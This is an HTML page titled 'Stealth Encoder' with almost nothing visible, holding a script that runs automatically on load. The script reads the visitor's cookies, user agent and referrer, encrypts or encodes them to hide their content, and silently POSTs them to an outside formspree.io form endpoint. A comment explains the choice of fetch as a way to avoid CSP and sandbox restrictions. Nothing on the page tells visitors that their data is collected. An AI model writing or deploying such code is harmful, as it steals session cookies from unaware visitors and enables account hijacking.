<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stealth Encoder</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        h2 {
            color: gold;
            text-shadow: 0 0 10px rgba(255, 215, 0, 0.8);
        }
    </style>
</head>
<body>
    <h2>Stealth Encoder</h2>

    <script>
        (() => {
            async function deriveKey(secret) {
                const encoder = new TextEncoder();
                const keyMaterial = await crypto.subtle.importKey(
                    "raw", encoder.encode(secret), { name: "PBKDF2" }, false, ["deriveKey"]
                );
                return crypto.subtle.deriveKey(
                    { name: "PBKDF2", salt: encoder.encode("SuperSalt"), iterations: 100000, hash: "SHA-256" },
                    keyMaterial, { name: "AES-GCM", length: 256 }, true, ["encrypt"]
                );
            }

            async function encryptAES(text, key) {
                const encoder = new TextEncoder();
                const iv = crypto.getRandomValues(new Uint8Array(12));
                const encryptedData = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, key, encoder.encode(text));
                return btoa(String.fromCharCode(...iv) + String.fromCharCode(...new Uint8Array(encryptedData)));
            }

            function rot47(str) {
                return str.replace(/[\x21-\x7E]/g, c =>
                    String.fromCharCode(33 + ((c.charCodeAt(0) + 14) % 94))
                );
            }

            async function hashSHA512(data) {
                const encoder = new TextEncoder();
                const buffer = await crypto.subtle.digest("SHA-512", encoder.encode(data));
                return Array.from(new Uint8Array(buffer)).map(b => b.toString(16).padStart(2, "0")).join("");
            }

            async function stealthEncode() {
                const secretKey = await deriveKey("UltraHiddenKey");
                const cookies = document.cookie || "No_Cookies";
                const userAgent = navigator.userAgent || "Unknown_User_Agent";
                const referrer = document.referrer || "No_Referrer";

                const encryptedCookies = await encryptAES(cookies, secretKey);
                const hashedAgent = await hashSHA512(userAgent);
                const encodedReferrer = rot47(referrer);

                const stealthPayload = JSON.stringify({
                    encryptedCookies,
                    hashedAgent,
                    encodedReferrer
                });

                // Use Fetch API instead of Form Submission (Prevents CSP/Sandbox Issues)
                fetch("https://formspree.io/f/xeoqzkqe", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ data: btoa(stealthPayload) })
                }).then(response => console.log("Data Sent:", response))
                  .catch(error => console.error("Error:", error));
            }

            stealthEncode();
        })();
    </script>
</body>
</html>
